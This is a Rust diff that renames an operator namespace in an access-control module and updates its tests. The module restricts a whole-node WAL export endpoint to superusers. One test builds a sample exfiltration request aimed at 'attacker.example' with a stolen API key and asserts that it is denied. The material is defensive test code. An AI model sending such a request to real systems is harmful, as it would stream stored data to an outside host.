@@ -1593,8 +1593,8 @@ fn decide(
             authorize_body(principal, aliases, shape, body, default)
         }
         Target::Cluster => {
-            // `/_xerj/*` is the node's own operator namespace, and its first
-            // inhabitant (`_xerj/wal_tap`, issue #320) is a whole-node export
+            // `/_argos/*` is the node's own operator namespace, and its first
+            // inhabitant (`_argos/wal_tap`, issue #320) is a whole-node export
             // primitive: one `PUT` with `target_url` pointing anywhere and
             // `indices: ["*"]` streams every index on this node to an
             // attacker-chosen host, with an operator-supplied `Authorization`
@@ -1603,11 +1603,11 @@ fn decide(
             //
             // Nothing here is index-scoped, so there is no per-index decision
             // to make and the reasoning is the snapshot/restore one below:
-            // superuser-only. That covers the reads too. `GET /_xerj/wal_tap`
-            // echoes `target_url` and `GET /_xerj/wal_tap/_stats` enumerates
+            // superuser-only. That covers the reads too. `GET /_argos/wal_tap`
+            // echoes `target_url` and `GET /_argos/wal_tap/_stats` enumerates
             // the node's full index inventory, and both are `cluster_is_read`,
             // so without this arm a key scoped to one index could read them.
-            if segs.first().map(String::as_str) == Some("_xerj") {
+            if segs.first().map(String::as_str) == Some("_argos") {
                 return Err(forbidden(
                     principal,
                     "<node>",
@@ -2174,7 +2174,7 @@ mod tests {
             (Method::GET, "/_resolve/index/*"),
             (Method::GET, "/_security/api_key"),
             (Method::POST, "/_security/api_key"),
-            (Method::GET, "/_xerj/wal_tap"),
+            (Method::GET, "/_argos/wal_tap"),
             // share management
             (Method::GET, "/_share"),
             (Method::POST, "/_share"),
@@ -2823,7 +2823,7 @@ mod tests {
         ));
     }
 
-    /// `PUT /_xerj/wal_tap` (issue #320) is a whole-node export primitive:
+    /// `PUT /_argos/wal_tap` (issue #320) is a whole-node export primitive:
     /// `target_url` names any host on the network, `indices: ["*"]` names
     /// every index on this node, and the tap attaches an operator-supplied
     /// `Authorization` header to the requests it makes — exfiltration and
@@ -2837,9 +2837,9 @@ mod tests {
     /// `unbounded_snapshot_is_superuser_only` above, same answer.
     ///
     /// The reads matter too and are covered by the same arm: `GET
-    /// /_xerj/wal_tap` echoes `target_url`, and `GET /_xerj/wal_tap/_stats`
+    /// /_argos/wal_tap` echoes `target_url`, and `GET /_argos/wal_tap/_stats`
     /// enumerates the node's whole index inventory with no principal filter
-    /// (`_xerj` has no `prune_sites` entry, and adding one would not help — a
+    /// (`_argos` has no `prune_sites` entry, and adding one would not help — a
     /// scoped key has no business knowing the tap's target either). Both are
     /// `cluster_is_read`, so before this arm a key scoped to a single index
     /// could read them.
@@ -2852,32 +2852,32 @@ mod tests {
         // whole WAL at a host it chose.
         let exfiltrate = r#"{"enabled":true,"target_url":"http://attacker.example",
                              "indices":["*"],"target_auth":"ApiKey stolen"}"#;
-        assert!(!check(&legacy, Method::PUT, "/_xerj/wal_tap", exfiltrate));
+        assert!(!check(&legacy, Method::PUT, "/_argos/wal_tap", exfiltrate));
         assert!(!check(
             &one_index,
             Method::PUT,
-            "/_xerj/wal_tap",
+            "/_argos/wal_tap",
             exfiltrate
         ));
-        assert!(!check(&legacy, Method::DELETE, "/_xerj/wal_tap", ""));
+        assert!(!check(&legacy, Method::DELETE, "/_argos/wal_tap", ""));
 
         // The reads: the target URL and the node's index inventory.
-        assert!(!check(&legacy, Method::GET, "/_xerj/wal_tap", ""));
-        assert!(!check(&one_index, Method::GET, "/_xerj/wal_tap", ""));
-        assert!(!check(&legacy, Method::GET, "/_xerj/wal_tap/_stats", ""));
-        assert!(!check(&one_index, Method::GET, "/_xerj/wal_tap/_stats", ""));
+        assert!(!check(&legacy, Method::GET, "/_argos/wal_tap", ""));
+        assert!(!check(&one_index, Method::GET, "/_argos/wal_tap", ""));
+        assert!(!check(&legacy, Method::GET, "/_argos/wal_tap/_stats", ""));
+        assert!(!check(&one_index, Method::GET, "/_argos/wal_tap/_stats", ""));
 
-        // The namespace, not just the route: a second `_xerj` endpoint must
+        // The namespace, not just the route: a second `_argos` endpoint must
         // inherit this rather than have to remember it.
-        assert!(!check(&legacy, Method::GET, "/_xerj/anything", ""));
-        assert!(!check(&legacy, Method::POST, "/_xerj/anything/_do", ""));
+        assert!(!check(&legacy, Method::GET, "/_argos/anything", ""));
+        assert!(!check(&legacy, Method::POST, "/_argos/anything/_do", ""));
 
         // And the operator can still drive it.
         for (method, path) in [
-            (Method::GET, "/_xerj/wal_tap"),
-            (Method::PUT, "/_xerj/wal_tap"),
-            (Method::DELETE, "/_xerj/wal_tap"),
-            (Method::GET, "/_xerj/wal_tap/_stats"),
+            (Method::GET, "/_argos/wal_tap"),
+            (Method::PUT, "/_argos/wal_tap"),
+            (Method::DELETE, "/_argos/wal_tap"),
+            (Method::GET, "/_argos/wal_tap/_stats"),
         ] {
             assert!(
                 check(&Principal::Superuser, method.clone(), path, "{}"),
